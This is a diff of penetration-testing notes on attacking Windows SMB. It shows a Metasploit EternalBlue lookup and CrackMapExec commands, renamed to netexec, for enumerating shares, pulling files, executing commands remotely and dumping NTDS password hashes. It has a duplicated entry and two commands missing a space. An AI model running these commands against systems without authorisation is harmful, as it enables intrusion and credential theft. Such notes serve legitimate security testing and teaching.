@@ -72,7 +72,6 @@ After validating the existance of the vulnerability, it can be exploited using `
 msfconsole
 search eternalblue
 use 0
-
 ```
 
 # Smbmap
@@ -88,7 +87,7 @@ smbmap -H ip -u username -p password
 CME can enumerate users and their privileges on Windows systems using the SMB protocol.
 ### Basic Usage
 ```bash
-crackmapexec smb <ip> -u 'username' -p 'password'
+netexec smb <ip> -u 'username' -p 'password'
 ```
 
 Once you have successfully authenticated to the SMB service on the target machine using **CrackMapExec** (CME), there are several actions you can take to further assess the security of the system or gather more information. Here’s a list of potential next steps:
@@ -96,39 +95,39 @@ Once you have successfully authenticated to the SMB service on the target machin
 - Enumerate Shares
 
 ```bash
-crackmapexec smb <ip> -u 'username' -p 'password' --shares
+netexec smb <ip> -u 'username' -p 'password' --shares
 ```
 
 - Access shared files
 
 ```bash
-crackmapexec smb <ip> -u 'username' -p 'password' --get 'share_name/file_path'
+netexec smb <ip> -u 'username' -p 'password' --get 'share_name/file_path'
 ```
 
 - Access shared files
 
 ```bash
-crackmapexec smb <ip> -u 'username' -p 'password' --get 'share_name/file_path'
+netexec smb <ip> -u 'username' -p 'password' --get 'share_name/file_path'
 ```
 
 - Execute Commands Remotely
 
 ```bash
-crackmapexec smb <ip> -u 'username' -p 'password' --exec -c 'command'
+netexec smb <ip> -u 'username' -p 'password' --exec -c 'command'
 ```
 
 
 - Check User and Group Information
 
 ```bash
-crackmapexec smb <ip> -u 'username' -p 'password'--users
+netexec smb <ip> -u 'username' -p 'password'--users
 ```
 
 
 - Password Dumping
 
 ```bash
-crackmapexec smb <ip> -u 'username' -p 'password'--ntds
+netexec smb <ip> -u 'username' -p 'password'--ntds
 ```
 
 ### --rid-brute
